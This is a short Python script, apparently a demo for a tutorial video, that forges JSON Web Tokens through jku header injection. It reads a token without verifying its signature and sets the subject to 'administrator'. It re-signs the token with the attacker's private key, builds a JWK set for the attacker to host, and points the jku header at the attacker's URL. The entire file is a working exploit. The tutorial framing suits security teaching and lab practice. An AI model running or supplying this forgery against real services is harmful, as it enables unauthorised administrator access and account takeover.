# Demo script for 'JWT Authentication Bypass via jku Header Injection' video: https://youtu.be/hMRdMmll8Bk
import jwt
import base64
import json
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Take a JWT and JKU URL as input
token = 'INSERT_TOKEN_HERE'
jku_url = 'INSERT_URL_HERE'

# Load and serialize the public key
with open('public_key.pem', 'rb') as f:
    public_key = serialization.load_pem_public_key(
        f.read(),
        backend=default_backend()
    )

# Decode the JWT
decoded_token = jwt.decode(token, options={"verify_signature": False})
print(f"Decoded token:\n{json.dumps(decoded_token, indent=4)}\n")
decoded_header = jwt.get_unverified_header(token)
print(f"Decoded header:\n{json.dumps(decoded_header, indent=4)}\n")

# Modify the token (JWT manipulation)
decoded_token['sub'] = 'administrator'
print(f"Modified token:\n{json.dumps(decoded_token, indent=4)}\n")

# Sign the modified JWT using your RSA private key
with open('private_key.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(
        f.read(),
        password=None,
        backend=default_backend()
    )

# Extract the necessary information from the keys
public_key = private_key.public_key()
public_numbers = public_key.public_numbers()

# Build the JWKs
jwk = {
    "kty": "RSA",
    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8'),
    "kid": decoded_header['kid'],
    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
}
keys = {"keys": [jwk]}
print(f"JWK:\n{json.dumps(keys, indent=4)}\n")

# Generate the modified token
modified_token = jwt.encode(decoded_token, private_key, algorithm='RS256', headers={'jku': jku_url, 'kid': jwk['kid']})

# Print the modified token header
print(f"Modified header:\n{json.dumps(jwt.get_unverified_header(modified_token), indent=4)}\n")

# Print the final token
print("Final Token: " + modified_token)